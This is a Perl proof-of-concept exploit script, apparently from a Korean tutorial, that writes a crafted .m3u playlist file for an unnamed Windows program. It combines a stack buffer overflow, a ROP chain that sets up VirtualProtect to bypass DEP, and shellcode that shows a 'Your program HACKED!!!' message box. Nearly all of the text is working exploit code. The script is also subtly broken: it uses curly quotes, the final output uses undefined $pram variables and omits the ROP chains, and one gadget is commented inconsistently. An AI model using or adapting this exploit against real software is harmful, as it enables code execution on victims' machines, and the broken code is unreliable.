my $file = "ROPMsgBox32.Full.m3u";
my $junk = "\x41" x 0x108;
my $eip  = pack('V', 0x00410427); #return to stack


my $rop1 =  pack('V', 0x5AD79277);	#{PUSH ESP}{MOV EAX,EDX}{POP EDI}{RET}
$rop1=$rop1.pack('V', 0x77C1E842);	#{PUSH EDI}{POP EAX}{POP EBP}{RET}
$rop1=$rop1.“AAAA”;					#“POP EBP”에 대한 패딩
$rop1=$rop1.pack('V', 0x1001653D);	#{ADD ESP,18h}{RET}


my $fncAddr =  pack('V', 0x757CA3D0); 	#VirtualProtect 시작 번지
my $retAddr	= "XXXX";					#VirtualProtect 복귀 번지
my $param1	= "YYYY";					#매개변수 lpAddress 
my $param2	= "ZZZZ";					#매개변수 dwSize
my $param3	= pack('V', 0x00000040);	#매개변수 flNewProtect: EXECUTE_READWRITE
my $param4	= pack('V', 0x004181F0);	#매개변수 lpflOldProtect: 0x004181F0. PE의 .data 영역 번지
my $val_4_VP = $fncAddr.$retAddr.$param1.$param2.$param3.$param4;


my $rop2 =  pack('V', 0x763C982F);	#{XCHG ESI,EDI}{DEC ECX}{RET 4}
$rop2=$rop2."AAAA"; 				#"RET 4”에 대한 패딩
$rop2=$rop2.pack('V', 0x1002DC4C); 	#{ADD EAX,100h}{POP EBP}{RET}
$rop2=$rop2."AAAA"; 				#“POP EBP”에 대한 패딩
$rop2=$rop2.pack('V', 0x77E84115);	#{MOV DWORD PTR DS:[ESI+10h],EAX}{MOV EAX,ESI}{POP ESI}{RET}
$rop2=$rop2."AAAA"; 				#“POP ESI"에 대한 패딩


my $rop3 =  pack('V', 0x775D131E);	#{PUSH EAX}{POP ESI}{RET}
$rop3=$rop3.pack('V', 0x1002DC4C);	#{ADD EAX,100h}{POP EBP}{RET}
$rop3=$rop3.“AAAA”;					#“POP EBP"에 대한 패딩
$rop3=$rop3.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop3=$rop3.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop3=$rop3.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop3=$rop3.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop3=$rop3.pack('V', 0x77E84115);	#{MOV DWORD PTR DS:[ESI+10h],EAX}{MOV EAX,ESI}{POP ESI}{RET}
$rop3=$rop3.“AAAA”;					#“POP ESI"에 대한 패딩


my $rop4 =  pack('V', 0x775D131E);	#{PUSH EAX}{POP ESI}{RET}
$rop4=$rop4.pack('V', 0x77E84115);	#{XOR EAX,EAX}{RET}
$rop4=$rop4.pack('V', 0x1002DC4C);	#{ADD EAX,100h}{POP EBP}{RET}
$rop4=$rop4.“AAAA”;					#“POP EBP"에 대한 패딩
$rop4=$rop4.pack('V', 0x1002DC4C);	#{ADD EAX,100h}{POP EBP}{RET}
$rop4=$rop4.“AAAA”;					#“POP EBP"에 대한 패딩
$rop4=$rop4.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop4=$rop4.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop4=$rop4.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop4=$rop4.pack('V', 0x77157D1D);	#{INC ESI}{RET}
$rop4=$rop4.pack('V', 0x77E84115);	#{MOV DWORD PTR DS:[ESI+10h],EAX}{MOV EAX,ESI}{POP ESI}{RET}
$rop4=$rop4.“AAAA”;					#“POP ESI"에 대한 패딩


my $rop5 =  pack('V', 0x775D12F1);	# {SUB EAX,4}{RET}
$rop5=$rop5.pack('V', 0x73DF5CA8);	# {PUSH EAX}{POP ESP}{MOV EAX,EDI}{POP EDI}{POP ESI}{RET}


my $shellcode = "\x90" x 4; # 0x90 = NOP
$shellcode = $shellcode.
"\x6A\x10".
"\x6A\x00".
"\x8D\x44\x24\x28".	# 0x28
"\x50".
"\x6A\x00".
"\xFF\x15\x84\x91\x41\x00".	#MessageBoxA(0x00419184)
"\x6A\x01".
"\xFF\x15\x0C\x91\x41\x00";	#exit(0x0041910C)
my $junk2 = "\x90" x 3;
my $mesg = "Your program HACKED!!!\x00\x00";
open($FILE, ">$file");
print $FILE $junk.$eip.$retAddr.$pram1.$pram2.$pram3.$pram4.$shellcode.$junk2.$mesg;
close($FILE);
print "m3u File Created Successfully \n";



